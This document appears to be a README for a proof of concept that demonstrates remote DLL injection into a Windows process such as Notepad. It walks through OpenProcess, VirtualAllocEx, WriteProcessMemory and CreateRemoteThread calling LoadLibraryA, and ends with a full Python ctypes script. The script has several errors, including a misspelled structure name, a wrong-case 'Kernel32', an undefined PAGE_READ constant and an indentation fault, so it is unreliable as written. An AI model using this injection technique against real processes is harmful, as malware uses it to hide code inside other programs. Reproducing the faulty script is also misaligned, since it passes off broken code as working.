# Remote DLL Injection
## Overview
This POC demonstrates a technique known as remote DLL injection. The goal is to force a target process (for example, Notepad) to load an external DLL (Dynamic Link Library). The process involves three main steps:

  1. Allocating Memory in the Remote Process: Reserve a block of memory in the target process’s address space.
  2. Writing the DLL Path: Write the path (as a byte string) of the DLL into the allocated memory.
  3. Forcing the DLL to Load: Use the Windows API function LoadLibraryA—located via GetProcAddress on kernel32.dll—by creating a remote thread that calls it, passing the address of the DLL path in memory.

This technique is commonly used for injecting code into a process for either legitimate purposes (such as extending the functionality of a running application) or by malware for nefarious reasons.

## Detailed Code Walkthrough

1. Importing Modules and Defining API Functions
    1. ctypes and wintypes:
       The code imports the ctypes module and its wintypes submodule. This allows the script to interact directly with Windows API functions. The API calls are performed by calling functions in kernel32.dll, a core Windows DLL.

    2. Function Prototypes:
       The POC defines the argument types (argtypes) and return types (restype) for the following functions:
         1. OpenProcess: Opens an existing process given its process ID (PID) with specific access rights.
         2. VirtualAllocEx: Allocates a block of memory within the address space of the target process.
         3. WriteProcessMemory: Writes data (the DLL path) into the allocated memory in the remote process.
         4. GetModuleHandleA: Retrieves a handle to a loaded module (here, kernel32.dll).
         5. GetProcAddress: Finds the address of an exported function (in this case, LoadLibraryA) within a module.
         6. CreateRemoteThread: Creates a new thread in the remote process that will call the specified function—in our case, to load the DLL.

    3. Defining Structures:
       The code also defines the _SECURITY_ATTRIBUTES structure. Although this structure isn’t used in every detail, it is necessary when creating a remote thread to specify attributes like whether handles are inherited by child processes.

2. Preparing the Injection Payload
   1. DLL Path String:
   A byte string variable named dll holds the path to the compiled DLL file that you intend to inject. This must be a valid
   path that the target process can access.

   2. Process Identification:
   The variable pid is set to the target process’s ID (for example, Notepad’s PID). This value is used to open the process and
   manipulate its memory.

3. Opening the Target Process
   1. Using OpenProcess:
   The OpenProcess function is called with the PROCESS_ALL_ACCESS flag, which grants the maximum level of access required for
   injection.
   If OpenProcess fails (returns a NULL handle), an error is raised. Successful retrieval of a valid handle is critical for subsequent operations.
###
   ```bash
handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
if not handle:
    raise WinError()
print("Handle obtained ⇒", hex(handle))
   ```
4. Allocating Memory in the Remote Process
   1. VirtualAllocEx Call:
   VirtualAllocEx is used to reserve a block of memory in the target process’s address space.
   The size of the memory allocated is determined by the length of the DLL path string. The allocation is done using the
   flags MEM_COMMIT | MEM_RESERVE, and the memory is initially marked as PAGE_READWRITE so that it can be modified.
## Code
   ```bash
remote_memory = VirtualAllocEx(handle, False, len(dll) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
if not remote_memory:
    raise WinError()
print("Memory allocated ⇒", hex(remote_memory))
   ```
5. Writing the DLL Path into Remote Memory
   1. WriteProcessMemory Call:
   Once memory is allocated, the DLL path is written into the remote process using WriteProcessMemory.
   This step places the path (as a string) into the process’s memory space so that it can later be used by the LoadLibraryA
   function.
## Code
   ```bash
write = WriteProcessMemory(handle, remote_memory, dll, len(dll) + 1, None)
if not write:
    raise WinError()
print("Bytes written ⇒", dll)
   ```
6. Locating the LoadLibraryA Function
   1. Retrieving the Address of LoadLibraryA:
   The function GetModuleHandleA is used to get a handle for kernel32.dll—a critical module that contains the LoadLibraryA
   function.
   Then, GetProcAddress retrieves the address of LoadLibraryA within that module.
   This address will be the entry point for loading the DLL into the remote process.
## Code
   ```bash
load_lib = GetProcAddress(GetModuleHandle(b"kernel32.dll"), b"LoadLibraryA")
print("LoadLibrary address ⇒", hex(load_lib))
   ```
7. Creating a Remote Thread to Load the DLL
   1. Executing the DLL Injection:
   With the address of LoadLibraryA and the memory location holding the DLL path, CreateRemoteThread is invoked.
   This function creates a new thread in the target process that begins execution at the LoadLibraryA function, with the
   argument being the address of the DLL path in remote memory.
   When the thread runs, LoadLibraryA loads the DLL, thus completing the injection.
## Code
   ```bash
rthread = CreateRemoteThread(handle, None, 0, load_lib, remote_memory, EXECUTE_IMMEDIATELY, None)
   ```

## Code ~ Remote DLL Injection
## Code
   ```bash
from ctypes import *
from ctypes import wintypes

kernel32 = windll.kernel32
LPCTSTR = c_char_p
SIZE_T = c_size_t

OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
OpenProcess.restype = wintypes.HANDLE

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD)
VirtualAllocEx.restype = wintypes.LPVOID

WriteProcessMemory = Kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T))
WriteProcessMemory.restype = wintypes.BOOL

GetModuleHandle = kernel32.GetModuleHandleA
GetModuleHandle.argtypes = (LPCTSTR, )
GetModuleHandle.restype = wintypes.HANDLE

GetProcAddress = kernel32.GetProcAddress
GetProcAddress.argtypes = (wintypes.HANDLE, LPCTSTR)
GetProcAddress.restypes = wintypes.LPVOID

class _SECURITY_ATTRIBUTES(Structure):
	_fields_ = [('nlengths', wintypes.DWORD),
							('lpSecurityDescriptor', wintypes.LPVOID),
							('bInheritHandle', wintypes.BOOL),]

SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = POINTER(_SECUIRTY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID

CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD)
CreateRemoteThread.restype = wintypes.HANDLE

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
EXECUTE_IMMEDIATELY = 0X0
PROCESS_ALL_ACCESS = (0X000F0000 | 0X00100000 | 0X00000FFF)

dll = b"<path to the compiled dll file>"

pid = 2160 #process id of a process such as Notepad

handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)

if not handle:
	raise WinError()
	
print("Handle obtained => {0:X}".format(handle))

remote_memory = VirtualAllocEx(handle, False, len(dll) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READ)

	if not remote_memory:
		raise WinError()

print("Memory allocated => ", hex(remote_memory))

write = WriteProcessMemory(handle, remote_memory, dll, len(dll) + 1, None)

if not write:
	raise WinError()

print("Bytes written => {}".format(dll))

load_lib = GetProcAddress(GetModuleHandle(b"kernel32.dll"), b"LoadLibraryA")

print("LoadLibrary address => ", hex(load_lib))

rthread = CreateRemoteThread(handle, None, 0, load_lib, remote_memory, EXECUTE_IMMEDIATELY, None)
   ```
